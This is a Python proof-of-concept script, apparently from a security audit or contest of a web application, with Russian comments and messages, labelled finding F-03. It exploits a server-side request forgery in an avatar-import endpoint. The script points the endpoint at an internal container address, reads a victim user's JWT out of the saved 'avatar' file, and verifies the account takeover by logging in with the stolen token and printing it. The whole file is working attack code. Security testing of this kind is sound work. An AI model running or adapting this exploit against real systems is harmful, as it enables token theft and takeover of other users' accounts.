# -*- coding: utf-8 -*-
"""F-03. Импорт аватара ходит на имя контейнера, минуя чёрный список,
и забирает JWT с GET /internal/users/<username>/token.
Прямой URL /internal/ с хоста nginx не проксирует.
"""
import time

from _http import Client, parser


def main():
    p = parser("SSRF в импорте аватара -> JWT жертвы")
    p.add_argument("--victim", default="alice")
    p.add_argument("--via", default="contest-backend-1", help="DNS-имя контейнера backend в сети Compose")
    args = p.parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]
    token = client.register(f"ssrf{stamp}", f"ssrf{stamp}@poc.local", "Passw0rd!ssrf")

    url = f"http://{args.via}:8080/internal/users/{args.victim}/token"
    status, data, raw = client.call(
        "POST",
        "/api/user/avatar/import",
        token=token,
        body={"url": url},
        timeout=12,
    )
    if status != 200 or not data:
        raise SystemExit(f"импорт не удался: {status} {raw[:300]!r}")
    image = data["user"].get("image") or ""
    if not image.startswith("/uploads/"):
        raise SystemExit(f"нет публичного пути к ответу: {image}")

    status, parsed, raw = client.call("GET", image)
    if status != 200 or not parsed or "token" not in parsed:
        raise SystemExit(f"файл аватара не содержит JWT: {status} {raw[:200]!r}")
    stolen = parsed["token"]
    status, who, _ = client.call("GET", "/api/user", token=stolen)
    if status != 200 or who["user"]["username"] != args.victim:
        raise SystemExit(f"украденный токен не открыл {args.victim}: {status} {who}")
    print(f"OK {args.victim} email={who['user']['email']} файл={image}")
    print(stolen)


if __name__ == "__main__":
    main()
